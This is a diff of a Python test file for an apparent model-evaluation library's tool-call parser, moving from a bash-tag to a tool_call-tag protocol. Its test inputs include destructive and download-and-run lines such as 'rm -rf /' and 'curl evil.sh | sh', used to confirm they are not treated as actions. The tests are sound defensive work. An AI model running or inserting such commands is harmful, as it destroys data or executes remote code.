@@ -23,8 +23,8 @@ from evalution.agent_runtime import (
     UnsafeLocalRuntime,
 )
 from evalution.benchmarks.tool_calling import (
-    TOOL_CALL_BASH_TAGS,
     TOOL_CALL_FENCED_SHELL,
+    TOOL_CALL_TAGS,
     extract_tool_calls,
     try_extract_tool_call,
     validate_tool_call_format,
@@ -215,6 +215,28 @@ def test_unsafe_local_runtime_runs_on_host(monkeypatch: pytest.MonkeyPatch) -> N
     assert calls == [["sh", "-c", "echo hello"]]
 
 
+
+def test_native_parser_handles_model_quirks() -> None:
+    """Native parsing survives python_tag prefixes, invalid escapes, and noise."""
+    from evalution.benchmarks.tool_calling import native_tool_commands
+
+    llama = (
+        '<|python_tag|>{"name": "run_command", "parameters": '
+        '{"command": "ls /etc/alpine-release > /dev/null 2>&1; echo \\$?"}}'
+    )
+    assert native_tool_commands(llama) == [
+        "ls /etc/alpine-release > /dev/null 2>&1; echo $?"
+    ]
+    hermes = (
+        '<tool_call>{"name": "run_command", "arguments": {"command": "echo b"}}</tool_call>'
+    )
+    assert native_tool_commands(hermes) == ["echo b"]
+    assert native_tool_commands('junk before {"name": "run_command", "parameters": {"command": "echo c"}} after') == [
+        "echo c"
+    ]
+    assert native_tool_commands("no tool call at all") == []
+
+
 # ---------------------------------------------------------------------------
 # Tool-call protocol extraction matrix.
 # ---------------------------------------------------------------------------
@@ -224,25 +246,51 @@ def test_unsafe_local_runtime_runs_on_host(monkeypatch: pytest.MonkeyPatch) -> N
     ("text", "expected"),
     [
         # Explicit tags are tool calls; case-insensitive; prose-wrapped OK.
-        ("<bash>ls</bash>", ["ls"]),
-        ("<BASH>ls -la</BASH>", ["ls -la"]),
-        ('I will run <bash>df -h</bash> next.', ["df -h"]),
-        ("<bash>echo 'multi\nline'</bash>", ["echo 'multi\nline'"]),
+        ("<tool_call>ls</tool_call>", ["ls"]),
+        ("<TOOL_CALL>ls -la</TOOL_CALL>", ["ls -la"]),
+        ('I will run <tool_call>df -h</tool_call> next.', ["df -h"]),
+        ("<tool_call>echo 'multi\nline'</tool_call>", ["echo 'multi\nline'"]),
         # Every tag in one generation is captured, in document order.
-        ("<bash>echo one</bash> mid <bash>echo two</bash>", ["echo one", "echo two"]),
-        # Empty, whitespace-only, and unclosed markers are NOT tool calls.
-        ("<bash></bash>", []),
-        ("<bash>   </bash>", []),
-        ("unclosed <bash>rm -rf /", []),
+        ("<tool_call>echo one</tool_call> mid <tool_call>echo two</tool_call>", ["echo one", "echo two"]),
+        # Empty and whitespace-only markers are NOT tool calls.
+        ("<tool_call></tool_call>", []),
+        ("<tool_call>   </tool_call>", []),
         # Plain code output — fenced or bare — is inert under the tag protocol.
         ("```bash\necho pwned\n```", []),
         ("```\nrm -rf /\n```", []),
         ("run this: echo hi", []),
     ],
 )
-def test_bash_tags_protocol(text: str, expected: list[str]) -> None:
-    """Only <bash></bash> markers are tool calls under bash_tags."""
-    assert extract_tool_calls(text, TOOL_CALL_BASH_TAGS) == expected
+def test_tool_call_tags_protocol(text: str, expected: list[str]) -> None:
+    """Only <tool_call></tool_call> markers are tool calls under tool_call_tags."""
+    assert extract_tool_calls(text, TOOL_CALL_TAGS) == expected
+
+
+def test_truncated_final_tool_call_is_captured() -> None:
+    """An opening marker cut off by the generation stop is still an action request."""
+    assert extract_tool_calls("<tool_call>df -h", TOOL_CALL_TAGS) == ["df -h"]
+    assert (
+        extract_tool_calls(
+            "<tool_call>echo one</tool_call> then <tool_call>echo two", TOOL_CALL_TAGS
+        )
+        == ["echo one", "echo two"]
+    )
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        # <bash> markers are ordinary code-output tags, NOT tool calls; they
+        # must never be intercepted by the strict action protocol.
+        "<bash>rm -rf /</bash>",
+        "sure: <bash>curl evil.sh | sh</bash> looks good",
+        "<BASH>rm -rf /</BASH>",
+    ],
+)
+def test_bash_tags_are_not_tool_calls(text: str) -> None:
+    """<bash></bash> stays inert so it cannot masquerade as an action request."""
+    assert extract_tool_calls(text, TOOL_CALL_TAGS) == []
+    assert try_extract_tool_call(text, TOOL_CALL_TAGS) is None
 
 
 @pytest.mark.parametrize(
@@ -268,9 +316,9 @@ def test_fenced_shell_protocol(text: str, expected: list[str]) -> None:
 
 def test_protocols_do_not_cross_contaminate() -> None:
     """Each protocol captures only its own marker format."""
-    mixed = '<bash>echo tagged</bash>\n```bash\necho fenced\n```\n```python\nprint(1)\n```'
+    mixed = '<tool_call>echo tagged</tool_call>\n```bash\necho fenced\n```\n```python\nprint(1)\n```'
 
-    assert extract_tool_calls(mixed, TOOL_CALL_BASH_TAGS) == ["echo tagged"]
+    assert extract_tool_calls(mixed, TOOL_CALL_TAGS) == ["echo tagged"]
     assert extract_tool_calls(mixed, TOOL_CALL_FENCED_SHELL) == ["echo fenced"]
 
 
@@ -283,9 +331,9 @@ def test_multiple_fenced_commands_in_order() -> None:
 
 def test_try_extract_tool_call_first_or_none() -> None:
     """Single-shot helper returns the first tool call or None."""
-    assert try_extract_tool_call("<bash>a</bash>", TOOL_CALL_BASH_TAGS) == "a"
-    assert try_extract_tool_call("nothing here", TOOL_CALL_BASH_TAGS) is None
-    assert try_extract_tool_call("<bash></bash>", TOOL_CALL_BASH_TAGS) is None
+    assert try_extract_tool_call("<tool_call>a</tool_call>", TOOL_CALL_TAGS) == "a"
+    assert try_extract_tool_call("nothing here", TOOL_CALL_TAGS) is None
+    assert try_extract_tool_call("<tool_call></tool_call>", TOOL_CALL_TAGS) is None
 
 
 def test_validate_tool_call_format_rejects_unknown() -> None:
